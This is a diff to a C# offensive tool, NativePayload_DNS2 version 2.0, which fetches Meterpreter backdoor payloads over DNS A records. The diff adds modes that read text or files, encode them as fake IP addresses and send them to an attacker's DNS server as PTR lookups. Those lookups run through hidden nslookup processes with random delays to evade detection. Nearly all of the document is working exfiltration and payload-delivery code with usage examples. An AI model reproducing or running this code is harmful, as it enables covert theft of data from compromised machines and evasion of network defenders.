@@ -9,20 +9,26 @@ namespace NativePayload_DNS2
 {
     class Program
     {
-                 
+        /// <summary>
+        /// this Code Tested in Windows Server 2008 R2 and Dnsmasq ver 2.72
+        /// </summary>
+        public static bool Is_4_OctetsMode = false;
+
         static void Main(string[] args)
         {
-           
+            
             Console.ForegroundColor = ConsoleColor.DarkGray;
             Console.WriteLine();
-            Console.WriteLine("NativePayload_DNS2 , Backdoor Payload Transferring by DNS Traffic (A Records)");
+            Console.WriteLine("NativePayload_DNS2 , Ver 2.0");
+            Console.WriteLine("Backdoor Payload Downloading by DNS Traffic (A Records)");
+           
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.WriteLine("Published by Damon Mohammadbagher Sep 2017");
+            Console.WriteLine("Published by Damon Mohammadbagher Sep-Oct 2017");
             if (args[0].ToUpper() == "HELP")
             {
                 Console.ForegroundColor = ConsoleColor.DarkYellow;
                 Console.WriteLine();
-                Console.WriteLine("[!] NativePayload_DNS2 , Backdoor Payload Transferring by DNS Traffic (A Records)");
+                Console.WriteLine("[!] NativePayload_DNS2 , Backdoor Payload Transferring by DNS Traffic (A Records)");                
                 Console.ForegroundColor = ConsoleColor.DarkCyan;
                 Console.WriteLine("[!] Syntax 1: Creating Meterperter Payload for Transferring by DNS A records");
                 Console.ForegroundColor = ConsoleColor.Cyan;
@@ -47,11 +53,28 @@ namespace NativePayload_DNS2
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("[!] Syntax 4: NativePayload_DNS2.exe \"Getdata\" \"DomainName\" FakeDNSServer  ");
                 Console.WriteLine("[!] Example4: NativePayload_DNS2.exe Getdata \"MICROSOFT.COM\" 192.168.56.1  ");
+                Console.ForegroundColor = ConsoleColor.DarkYellow;
+                Console.WriteLine();
+                Console.WriteLine("[!] DATA Exfiltration/Uploading by DNS Traffic (PTR Records)");
+                Console.ForegroundColor = ConsoleColor.DarkCyan;                
+                Console.WriteLine("[!] Syntax 5: Exfiltration / Uploading Text DATA via DNS PTR records");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("[!] Syntax 5: NativePayload_DNS2.exe \"Exf\" \"OctetMode 3 or 4\" Min.Max Delay \"Text\" FakeDNSServer  ");
+                Console.WriteLine("[!] Example5: NativePayload_DNS2.exe Exf 3 2.5 \"any text you want\" 192.168.56.1  ");
+                Console.WriteLine("[!] Example5: NativePayload_DNS2.exe Exf 4 1.6 \"any text you want\" 192.168.56.1  ");
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.DarkCyan;
+                Console.WriteLine("[!] Syntax 6: Exfiltration / Uploading Text-File DATA via DNS PTR records");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("[!] Syntax 6: NativePayload_DNS2.exe \"Exfile\" \"OctetMode 3 or 4\" Min.Max Delay \"Text-file.txt\" FakeDNSServer  ");
+                Console.WriteLine("[!] Example6: NativePayload_DNS2.exe Exfile 3 2.3 \"test.txt\" 192.168.56.1  ");
+                Console.WriteLine("[!] Example6: NativePayload_DNS2.exe Exfile 4 1.12 \"test.txt\" 192.168.56.1  ");
+
                 Console.ForegroundColor = ConsoleColor.Gray;
             }
             if (args[0].ToUpper() == "TEXTFILE")
             {
-
+                
                 string StartAddress = "0";
                 string DomainName = args[1];
                 string Payload = "";
@@ -64,10 +87,10 @@ namespace NativePayload_DNS2
                     Payload = args[2];                    
                 }
                 string Temp_Hex = "";                
-                int ChechkLength = Payload.Length % 3;
+                int CheckLength = Payload.Length % 3;
                 
 
-               if (Payload.Length > (3 * 255) || ChechkLength!=0)
+               if (Payload.Length > (3 * 255) || CheckLength!=0)
                 {
                     if (Payload.Length > (3 * 255))
                     {
@@ -82,14 +105,14 @@ namespace NativePayload_DNS2
                         Console.WriteLine("[x] Information : so you can not have Payload with more than 255 * 3 length ");
                         Console.ForegroundColor = ConsoleColor.Gray;
                     }
-                    if(ChechkLength != 0)
+                    if(CheckLength != 0)
                     {
                         Console.ForegroundColor = ConsoleColor.DarkYellow;
                         Console.WriteLine();
                         Console.WriteLine("[x] Your payload length % 3 should be 0");
                         Console.WriteLine("[x] Your payload length is {0}", Payload.Length.ToString());
                         Console.ForegroundColor = ConsoleColor.Red;
-                        Console.WriteLine("[x] Your payload length % 3 = {0}",ChechkLength.ToString());
+                        Console.WriteLine("[x] Your payload length % 3 = {0}", CheckLength.ToString());
                         Console.WriteLine("[x] For fixing you should Remove/Add one or two strings to your payload ;)");
                         Console.ForegroundColor = ConsoleColor.Gray;
                     }
@@ -102,7 +125,7 @@ namespace NativePayload_DNS2
                         Temp_Hex += string.Format("{0:x2}", (Int32)Convert.ToInt32(tmp.ToString())) + ",";
                     }
 
-                    SortIPAddress(Temp_Hex, StartAddress, DomainName);
+                    SortIPAddress(Temp_Hex, StartAddress, DomainName,false);
                 }
               
             }
@@ -127,7 +150,7 @@ namespace NativePayload_DNS2
                 }
                 else
                 {
-                    SortIPAddress(Payload, StartAddress, DomainName);
+                    SortIPAddress(Payload, StartAddress, DomainName,false);
                 }
             }
             if (args[0].ToUpper() == "SESSION")
@@ -160,11 +183,69 @@ namespace NativePayload_DNS2
                 Console.ForegroundColor = ConsoleColor.Gray;
                 Console.Write(UTF8Encoding.UTF8.GetChars(_Exfiltration_DATA_Bytes_A_Records));                
                 Console.WriteLine();
-            }   
-           
+            }
+            if (args[0].ToUpper() == "EXF")
+            {
+                if (args.Length > 2)
+                {
+                    if (args[1] == "4")
+                    {
+                        /// exfiltration by Text/String 
+                        /// octets Mode 4
+                        Is_4_OctetsMode = true;
+                        byte[] S = UnicodeEncoding.ASCII.GetBytes(args[3]);
+                        string SS = UnicodeEncoding.ASCII.GetString(S);
+                        __nslookup(SS, args[4], true, Convert.ToInt32(args[2].Split('.')[0] + "000"), Convert.ToInt32(args[2].Split('.')[1] + "000"));
+                    }
+                    if (args[1] == "3")
+                    {
+                        /// exfiltration by Text/String 
+                        /// octets Mode 3
+                        Is_4_OctetsMode = false;
+                        byte[] S = UnicodeEncoding.ASCII.GetBytes(args[3]);
+                        string SS = UnicodeEncoding.ASCII.GetString(S);
+                        __nslookup(SS, args[4], true, Convert.ToInt32(args[2].Split('.')[0] + "000"), Convert.ToInt32(args[2].Split('.')[1] + "000"));
+                    }
+                }
+
+            }
+            if (args[0].ToUpper() == "EXFILE")
+            {
+                if (args.Length > 2)
+                {
+
+                    if (args[1] == "4")
+                    {
+                        /// exfiltration by Text File                 
+                        /// octets Mode 4
+                        Is_4_OctetsMode = true;
+                        
+                        byte[] TextFile = System.IO.File.ReadAllBytes(args[3]);
+                        string Unicode = UnicodeEncoding.ASCII.GetString(TextFile);
+                        __nslookup(Unicode, args[4], true, Convert.ToInt32(args[2].Split('.')[0] + "000"), Convert.ToInt32(args[2].Split('.')[1] + "000"));
+                    }
+                    if (args[1] == "3")
+                    {
+                        /// exfiltration by Text File
+                        /// octets Mode 3                 
+                        Is_4_OctetsMode = false;
+                        
+                        byte[] TextFile = System.IO.File.ReadAllBytes(args[3]);
+                        string Unicode = UnicodeEncoding.ASCII.GetString(TextFile);
+                        __nslookup(Unicode, args[4], true, Convert.ToInt32(args[2].Split('.')[0] + "000"), Convert.ToInt32(args[2].Split('.')[1] + "000"));
+                    }
+                }
+
+            }
 
         }
-        public static string SortIPAddress(string _Payload,string MainIP, string String_DomainName)
+        /// <summary>
+        /// Ver 1.0 
+        /// This Method Created in Ver 1.0 
+        /// for Creating Exfiltration DATA by 3 Octets "Mode 3" and PTR Request (Is_exfiltration_Mode = true)
+        /// also for Creating and Sorting A Records (Is_exfiltration_Mode = false)
+        /// </summary>        
+        public static string SortIPAddress(string _Payload,string MainIP, string String_DomainName,bool Is_exfiltration_Mode)
         {
             string[] X = _Payload.Split(',');
             string[] XX = new string[X.Length / 3];
@@ -209,16 +290,210 @@ namespace NativePayload_DNS2
                 Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + "." + (First_Octet + Int32.Parse(MainIP)).ToString() + " " + String_DomainName + " \r\n";
                 nique = "";
                 Display_counter++;
+                if (First_Octet == 255) First_Octet = 0;
             }
             Console.WriteLine();
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool");
-            Console.WriteLine();
-            Console.ForegroundColor = ConsoleColor.Gray;
-            Console.WriteLine(Final_DNS_Text_File);
-            return "";
+            if (!Is_exfiltration_Mode)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool");
+                Console.WriteLine();
+                Console.ForegroundColor = ConsoleColor.Gray;
+                Console.WriteLine(Final_DNS_Text_File);
+            }
+            if (Is_exfiltration_Mode)
+            {              
+                return Final_DNS_Text_File;
+            }
+            return Final_DNS_Text_File;
         }
-        public static string _Records;
+        /// <summary>
+        /// Ver 2.0
+        /// This Method Created in Ver 2.0 for Creating Exfiltration DATA by 4 Octets "Mode 4" (Is_exfiltration_Mode = true) , (Is_4_Octets = true).
+        /// , Description : "Reversing A Records Technique by PTR Records for exfiltration (Uploading) DATA to DNS server with 4 octets in IPv4 Address.        
+        /// in this case for reading these Exfiltrated Text/DATA , you need to read DNSMASQ Log-file by LogReader Tool"
+        ///  , Note : 4 octets for Creating A records for Downloading DATA from DNS Server "Not Supported" in this Ver 2.0
+        /// . Begin
+        /// </summary>        
+        public static string SortIPAddress(string _Payload, string String_DomainName, bool Is_exfiltration_Mode , bool Is_4_Octets)
+        {
+            string Final_DNS_Text_File = "";
+            if (Is_4_Octets)
+            {
+                string[] X = _Payload.Split(',');
+                string[] XX = new string[X.Length / 4];
+                int counter = 0;
+                int X_counter = 0;
+                string tmp = "";
+                Console.WriteLine();
+                for (int i = 0; i < X.Length;)
+                {
+
+                    tmp += X[i] + ",";
+                    i++;
+                    counter++;
+                    if (counter >= 4)
+                    {
+                        counter = 0;
+                        XX[X_counter] = tmp.Substring(0, tmp.Length - 1);
+                        X_counter++;
+                        tmp = "";
+                    }
+                }
+
+                string[] IP_Octets = new string[4];
+                string nique = "";
+                Final_DNS_Text_File = "";
+                int Display_counter = 0;
+                
+                foreach (var item in XX)
+                {
+                    
+                    IP_Octets = item.Split(',');
+                    if (Display_counter < 4)
+                        Console.Write(item.ToString() + " ====>  ");
+                    foreach (string itemS in IP_Octets)
+                    {
+                        int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);
+                        nique += (Tech.ToString() + ".");
+                    }
+                    if (Display_counter < 4)
+                        Console.WriteLine(nique.Substring(0, nique.Length - 1));
+                    Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + " " + String_DomainName + " \r\n";
+                    nique = "";
+                    Display_counter++;
+                    
+                }
+                Console.WriteLine();
+                if (!Is_exfiltration_Mode)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool");
+                    Console.WriteLine();
+                    Console.ForegroundColor = ConsoleColor.Gray;
+                    Console.WriteLine(Final_DNS_Text_File);
+                }
+                if (Is_exfiltration_Mode)
+                {
+                    return Final_DNS_Text_File;
+                }
+            }
+            return Final_DNS_Text_File;
+        }
+      
+        public static byte[] __nslookup(string Exfiltration_String, string DnsServer, bool Is_Exfiltration_Mode, Int32 min, Int32 max)
+        {
+            if (Is_Exfiltration_Mode)
+            {
+                if (min > max)
+                {
+                    Int32 t = min;
+                    min = max;
+                    max = t;
+                }
+               
+                string Temp_Hex = "";
+                int CheckLength = 0;
+
+                if (Is_4_OctetsMode)
+                {
+                    CheckLength = Exfiltration_String.Length % 4;
+                    /// debug error
+                    // Console.WriteLine("err value: {0}", CheckLength);
+                }
+                else if (!Is_4_OctetsMode)
+                {
+                    CheckLength = Exfiltration_String.Length % 3;
+                    /// debug error
+                    // Console.WriteLine("err value: {0}", CheckLength);
+                }
+
+                if (!Is_4_OctetsMode && CheckLength == 1) Exfiltration_String += "  ";
+                
+                if (!Is_4_OctetsMode && CheckLength == 2 ) Exfiltration_String += " ";
+                
+                if (Is_4_OctetsMode && (CheckLength == 2 || CheckLength == 3)) Exfiltration_String += "  ";
+
+                if (Is_4_OctetsMode && CheckLength == 1) Exfiltration_String += "   ";
+
+
+                foreach (char P in Exfiltration_String)
+                {
+                    int tmp = P;
+                    Temp_Hex += string.Format("{0:x2}", (Int32)Convert.ToInt32(tmp.ToString())) + ",";
+                }
+
+                string Exfiltration_Data = "";
+                if (Is_4_OctetsMode)
+                {
+                    /// Mode : 4 octets {w.x.y.z} is our payload
+                    Exfiltration_Data = SortIPAddress(Temp_Hex, "Null", true, true);
+                }
+                else if (!Is_4_OctetsMode)
+                {
+                    /// Mode : 3 octets {w.x.y}.Z , {w x y} is our payload and Z is our counter
+                    Exfiltration_Data = SortIPAddress(Temp_Hex, "0", "Null", true);
+                }
+
+                string[] PTR_Records = Exfiltration_Data.Split('\n');                
+                var random = new Random();
+               
+                Console.ForegroundColor = ConsoleColor.DarkGreen;
+                Console.WriteLine("[!] {0} Exfiltration Started", DateTime.Now.ToString());
+                Console.WriteLine("[!] Uploading DATA by Sending {0} PTR Request to DNS Server {1} ", (PTR_Records.Length - 1).ToString(), DnsServer);
+                Console.WriteLine("[!] DNS Request will send by Random Time with : min {0} , max {1} MilliSeconds", min.ToString(), max.ToString());
+                Console.ForegroundColor = ConsoleColor.Gray;
+                int RequestCounter = 1;
+                foreach (string item in PTR_Records)
+                {
+
+                    try
+                    {
+                        if (item != "")
+                        {
+                            
+                            /// Make DNS traffic for getting Meterpreter Payloads by nslookup
+                            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("nslookup.exe", item.Split(' ')[0] + " " + DnsServer);
+                            ns_Prcs_info.RedirectStandardInput = true;
+                            ns_Prcs_info.RedirectStandardOutput = true;
+                            ns_Prcs_info.RedirectStandardError = false;
+                            ns_Prcs_info.UseShellExecute = false;
+                            /// you can use Thread Sleep here 
+                            System.Threading.Thread.Sleep(random.Next(min, max));
+                            Process nslookup = new Process();
+                            nslookup.StartInfo = ns_Prcs_info;
+                            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                            nslookup.Start();
+                            Console.ForegroundColor = ConsoleColor.Green;
+                            Console.WriteLine("[>] {0} , {1} , DATA Uploading by Sending DNS PTR Record Request : {2}", RequestCounter.ToString(), DateTime.Now.ToString(), item.Split(' ')[0]);
+                            Console.ForegroundColor = ConsoleColor.DarkYellow;
+                            RequestCounter++;
+                        }
+
+                    }
+                    catch (Exception err)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Gray;
+                        Console.WriteLine("[x] " + err.Message);
+                    }
+
+                }
+                
+            }
+            System.Threading.Thread.Sleep(2500);
+            Console.ForegroundColor = ConsoleColor.Gray;
+            return null;
+        }
+        /// <summary>
+        /// Ver 2.0 
+        /// reversing this Technique by PTR Records for exfiltration (Uploading) DATA to DNS server
+        /// Adding Exfiltration Feature for Uploading DATA by DNS PTR Records to Attacker DNS Server 
+        /// in this case for reading these Exfiltrated DATA , you need to read DNSMASQ Log-file
+        /// End
+        /// </summary>
+
+        //public static string _Records;
+
         public static byte[] __nslookup(string DNS_PTR_A, string DnsServer)
         {
             /// Make DNS traffic for getting Meterpreter Payloads by nslookup
